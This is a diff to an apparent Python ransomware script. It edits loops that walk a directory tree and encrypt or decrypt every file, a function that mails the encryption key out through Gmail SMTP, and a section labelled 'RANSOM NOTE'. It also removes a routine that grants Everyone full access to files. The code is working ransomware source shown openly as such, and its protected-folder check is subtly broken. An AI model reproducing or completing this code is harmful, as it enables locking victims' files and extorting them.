@@ -20,9 +20,9 @@ protected_folders = ['PerfLogs', 'Windows', 'Internet Explorer']  # TODO
 
 
 """
-Send password by mail as a feature
+Send password by mail as a feature ?
 """
-def send_mail(sender, sender_password, reciever):
+def send_key_by_mail(sender, sender_password, reciever):
     server = 'smtp.gmail.com'
     port = 587
 
@@ -107,20 +107,6 @@ def encrypt_or_decrypt(filename, key, opt='encrypt'):
             print(ve)
 
 
-"""
-Deberia devolver los permisos correspondientes?
-"""
-def modify_permissions(filename):
-    userx, domain, type = win32security.LookupAccountName(os.getlogin(), "Everyone")
-    sd = win32security.GetFileSecurity(
-        filename, win32security.DACL_SECURITY_INFORMATION)
-    dacl = sd.GetSecurityDescriptorDacl()   # instead of dacl = win32security.ACL()
-    dacl.AddAccessAllowedAce(win32security.ACL_REVISION,
-                             con.FILE_ALL_ACCESS, userx)
-    sd.SetSecurityDescriptorDacl(1, dacl, 0)
-    win32security.SetFileSecurity(
-        filename, win32security.DACL_SECURITY_INFORMATION, sd)
-
 
 if __name__ == '__main__':
     write_key()
@@ -132,14 +118,12 @@ if __name__ == '__main__':
     root_vm_win = 'C:/Users/IEUser/test/'
 
     # ITERATE AND ENCRYPT
-    for root, dirs, files in os.walk(root_win):
-        # if dirs in protected_folders:
-        # continue
+    for root, dirs, files in os.walk(root):
+        if dirs in protected_folders:
+            continue
         for fn in files:
             full_path = root + os.sep + fn
             encrypt_or_decrypt(full_path, key)
-
-    print("All data was encrypted successfully ;)")
 
     # RANSOM NOTE
     sg.theme('DarkRed2')
@@ -172,9 +156,9 @@ if __name__ == '__main__':
             key = values[0]
 
             # ITERATE AND DECRYPT
-            for root, dirs, files in os.walk(root_win):
-                # if dirs in protected_folders:
-                # continue
+            for root, dirs, files in os.walk(root):
+                if dirs in protected_folders:
+                    continue
                 for fn in files:
                     full_path = root + os.sep + fn
                     try:
